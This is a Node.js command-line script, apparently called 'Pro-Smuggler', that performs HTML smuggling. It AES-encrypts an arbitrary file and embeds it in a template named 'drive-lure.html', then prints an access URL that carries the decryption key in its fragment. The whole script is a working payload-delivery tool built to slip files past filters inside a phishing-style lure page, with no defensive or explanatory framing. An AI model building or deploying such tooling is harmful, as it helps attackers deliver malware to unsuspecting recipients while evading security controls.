const fs = require('fs');
const crypto = require('crypto');
const { program } = require('commander');
const chalk = require('chalk');

program
  .requiredOption('-f, --file <path>', 'Path to the file to smuggle')
  .option('-o, --output <path>', 'Output HTML path', 'output.html')
  .parse(process.argv);

const options = program.opts();

async function generate() {
    console.log(chalk.blue('[*] Starting Pro-Smuggler...'));

    // 1. Setup Encryption
    const fileBuffer = fs.readFileSync(options.file);
    const key = crypto.randomBytes(32); // 256-bit
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

    // 2. Encrypt Payload
    const encrypted = Buffer.concat([cipher.update(fileBuffer), cipher.final()]);
    const tag = cipher.getAuthTag();

    // 3. Load Template and Inject
    let template = fs.readFileSync('./templates/drive-lure.html', 'utf8');
    const result = template
        .replace('{{PAYLOAD}}', encrypted.toString('base64'))
        .replace('{{IV}}', iv.toString('base64'))
        .replace('{{TAG}}', tag.toString('base64'));

    fs.writeFileSync(options.output, result);

    // 4. Output the unique access URL
    const keyHex = key.toString('hex');
    console.log(chalk.green(`\n[+] Successfully generated: ${options.output}`));
    console.log(chalk.yellow(`[!] Access URL: file://${process.cwd()}/${options.output}#${keyHex}`));
    console.log(chalk.red('[!] DO NOT lose the key after the "#". The file is useless without it.\n'));
}

generate();